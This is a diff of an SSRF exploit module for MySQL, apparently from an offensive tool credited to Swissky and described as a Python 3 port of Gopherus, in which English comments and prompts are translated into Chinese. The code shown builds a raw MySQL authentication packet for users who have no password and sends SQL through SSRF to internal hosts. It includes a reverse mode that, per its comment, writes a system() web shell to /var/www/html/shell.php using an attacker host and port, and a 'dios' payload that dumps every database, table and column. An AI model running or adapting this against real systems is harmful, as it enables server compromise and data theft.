@@ -3,11 +3,11 @@ import logging
 
 from core.utils import *
 
-# NOTE
-# This exploit is a Python 3 version of the Gopherus tool
+# 注意
+# 此利用代码是 Gopherus 工具的 Python 3 版本
 
 name = "mysql"
-description = "Execute MySQL command < 8.0"
+description = "执行 MySQL 命令（版本 < 8.0）"
 author = "Swissky"
 documentation = [
     "https://spyclub.tech/2018/02/05/2018-02-05-ssrf-through-gopher/",
@@ -24,38 +24,38 @@ class exploit:
     dios = "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#"
 
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
 
-        # Encode the username for the request
-        self.user = input("Give MySQL username: ")
+        # 对用户名进行编码以构造请求
+        self.user = input("请输入 MySQL 用户名: ")
         encode_user = binascii.hexlify(self.user.encode())
         user_length = len(self.user)
         temp = user_length - 4
         length = f"{(0xA3 + temp):x}"
 
-        # Authenticate to MySQL service - only work with users allowed without password
+        # 向 MySQL 服务认证 - 仅适用于允许无密码登录的用户
         dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
         dump += encode_user.decode()
         dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
         dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
         dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"
 
-        query = input("Give MySQL query to execute (reverse/dios or any SQL statement): ")
+        query = input("请输入要执行的 MySQL 查询（reverse/dios 或任意 SQL 语句）: ")
 
-        # Reverse shell - writing system() in /var/www/html/shell.php
+        # 反弹 shell - 将 system() 写入 /var/www/html/shell.php
         if query == "reverse":
             self.query = self.reverse
             if args.lhost == None:
-                self.query = self.query.replace("SERVER_HOST", input("Server Host:"))
+                self.query = self.query.replace("SERVER_HOST", input("服务器主机:"))
             else:
                 self.query = self.query.replace("SERVER_HOST", args.lhost)
 
             if args.lport == None:
-                self.query = self.query.replace("SERVER_PORT", input("Server Port:"))
+                self.query = self.query.replace("SERVER_PORT", input("服务器端口:"))
             else:
                 self.query = self.query.replace("SERVER_PORT", args.lport)
 
-        # Dump in one shot - extract every databases/tables/columns
+        # 一次性导出 - 提取所有数据库/表/列
         elif query == "dios":
             self.query = self.dios
 
@@ -64,11 +64,11 @@ class exploit:
 
         auth = dump.replace("\n", "")
 
-        # For every IP generated, send the payload and extract the result
+        # 对每个生成的 IP，发送 payload 并提取结果
         gen_host = gen_ip_list("127.0.0.1", args.level)
         for ip in gen_host:
             payload = self.get_payload(self.query, auth, ip)
-            logging.info(f"Generated payload : {payload}")
+            logging.info(f"生成的 payload : {payload}")
 
             r1 = requester.do_request(args.param, payload)
             r2 = requester.do_request(args.param, "")
